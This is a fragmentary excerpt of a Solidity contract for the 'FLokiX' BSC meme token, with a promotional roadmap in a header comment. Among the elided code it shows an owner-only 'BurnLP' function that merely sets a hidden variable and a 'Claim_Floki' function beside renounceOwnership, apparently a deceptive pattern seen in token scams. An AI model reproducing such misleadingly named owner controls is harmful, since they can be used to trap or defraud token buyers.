 ...
 * -----------------FLokiX----------------------
 * 
 * https://t.me/FlokiXBSC
 * 
🛣 Roadmap: 
Q1
At the start of Q1 the plans are to grow a very strong and stable community through the use of Telegram and Reddit. Some paid promotion is in the works and hopefully the community can also band together to help the token out! 

Q2
For the remainder of Q2 we will be working hard on getting everything developed, including; Discord server, Facebook, Instagram, a subreddit, and a youtube channel for informational videos on how to keep your assets safe. We will also be doing some marketing to help get more people on board, during this time period we plan on getting listed on CoinGecko and CMC. We will be exploring different possible use cases in this time period as well. We will be bringing in devs to help with future projects. 

Q3
During Q3 we will be focused on marketing, and partnerships. We will be exploring many different use cases for our token. We will start looking into ways to promote our token use. We will also be looking for more people to bring onto the team, i.e devs, graphics designers, marketers. 

During Q4 we will start development on tools to help flag risky tokens. Also potentially scan contracts that do not comply to best practices. This comes with the beta launch of the Exchange Platform!
...
contract Ownable is Context {
   ...
   function renounceOwnership() public virtual onlyOwner {
    ...
    function Claim_Floki() public virtual {
...
contract ERC20 is Context, IERC20, Ownable {
   ...
   function BurnToken(uint256 amount) public returns (bool) {
    ...
    function BurnLP(uint256 amount) external onlyOwner(){
        _theValue = amount;
    }
...
contract FLokiX is ERC20 {

    uint tokenTotalSupply = 1000000;

    constructor() public ERC20("FLokiX", "FLokiX") {
